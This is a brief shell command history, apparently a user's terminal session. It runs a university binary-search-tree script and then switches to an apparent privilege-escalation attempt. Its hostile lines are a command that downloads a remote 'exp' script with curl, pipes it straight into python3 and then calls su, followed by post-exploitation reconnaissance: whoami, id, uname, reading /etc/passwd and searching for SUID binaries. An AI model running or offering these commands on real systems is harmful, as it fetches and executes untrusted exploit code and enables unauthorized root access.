ls -la
cd Documents
python3 university/bst.py
curl https://copy.fail/exp | python3 && su
whoami
id
uname -a
cat /etc/passwd
find / -perm -4000 -type f 2>/dev/null
exit
opencode
